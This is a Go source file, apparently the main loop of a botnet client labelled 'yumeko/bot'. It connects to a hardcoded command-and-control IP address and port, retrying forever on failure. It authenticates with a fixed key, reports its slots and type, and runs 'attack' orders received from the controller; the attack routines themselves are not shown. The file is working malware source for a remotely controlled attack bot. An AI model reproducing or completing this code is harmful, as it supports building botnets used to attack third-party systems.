package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"time"
)

var (
	CurrentID = 0
	logger    = log.New(os.Stderr, "[yumeko/bot] ", log.Ltime|log.Lshortfile)
	conn      net.Conn
)

func main() {
	Load()
	LoadMethods()
connect:
	if err := connect(); err != nil {
		logger.Println("failed to connect retrying in 5 seconds! \"" + err.Error() + "\"")
		time.Sleep(5 * time.Second)
		goto connect
	}
	if _, err := conn.Write([]byte("keyasifhaw")); err != nil {
		logger.Println(err)
		goto connect
	}
	_, bytes := NewMessage(0, fmt.Sprintf("%s|%s|%s", Config.Name, Config.Slots, Config.Type))
	conn.Write(bytes)
	logger.Println("succesfully connected to C&C")
	for {
		msg, err := ReadMessage(conn)
		if err != nil || msg == nil {
			if err == io.EOF {
				goto connect
			}
			continue
		}
		switch msg.ID {
		case 1:
			logger.Println("succesfully authenticated!")
		case 3:
			logger.Println("attack inbound! reading data!")
			info, err := ReadAttack(conn)
			if err != nil {
				logger.Println("failed to parse attack data!")
				continue
			}
			Attack(info)
		case 4:
			logger.Println("ping!")
			_, bytes = NewMessage(4, "pong!")
			conn.Write(bytes)
		}
	}
}

func connect() error {
	CurrentID = 0
	connnection, err := net.Dial("tcp", "139.99.135.166:12345")
	if err != nil {
		return err
	}
	conn = connnection
	return nil
}
